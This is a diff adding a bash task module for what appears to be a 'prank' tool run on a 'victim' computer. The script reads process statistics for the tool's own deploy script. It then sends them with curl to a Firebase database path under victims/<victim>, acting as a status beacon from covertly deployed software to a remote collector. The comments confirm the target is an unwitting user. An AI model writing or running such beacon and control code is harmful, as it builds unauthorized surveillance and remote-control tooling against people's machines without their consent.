@@ -1,0 +1,52 @@
+#!/usr/bin/env bash
+# REST API
+# https://firebase.google.com/docs/reference/rest/database/
+
+# Get the location of this script.
+SCRIPTDIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
+
+# Define the task ID
+thisTaskID="status"
+
+# Get some default functions and variables from the deployment
+source "$SCRIPTDIR/deploy"
+
+
+###############################################################################
+
+# Get the program parameters.
+
+victim="$1"
+rootIteration="$2"
+
+###############################################################################
+
+# Your own code
+
+echo $SCRIPTDIR
+
+psResult=`ps aux | grep "$SCRIPTDIR/deploy" | grep -v grep | head -n1`
+dPID=`echo "$psResult" | cut -d\  -f2`
+dCPU=`echo "$psResult" | cut -d\  -f3`
+dMEM=`echo "$psResult" | cut -d\  -f4`
+dSTAT=`echo "$psResult" | cut -d\  -f8`
+dSTART=`echo "$psResult" | cut -d\  -f9`
+dRUNTIME=`echo "$psResult" | cut -d\  -f10`
+
+curl -X PUT -d "
+  {
+    \"PID\" : \"$dPID\",
+    \"CPU\" : \"$dCPU\",
+    \"MEM\" : \"$dMEM\",
+    \"STAT\" : \"$dSTAT\",
+    \"STARTTIME\" : \"$dSTART\",
+    \"RUNTIME\" : \"$dRUNTIME\"
+  }" \
+ "https://${firebaseProject}.firebaseio.com/victims/$victim/$thisTaskID.json"
+
+###############################################################################
+
+#Finally, you should sleep as well. Try not to use the computer's resources too much,
+# It is only a prank, after all.
+
+sleep 15
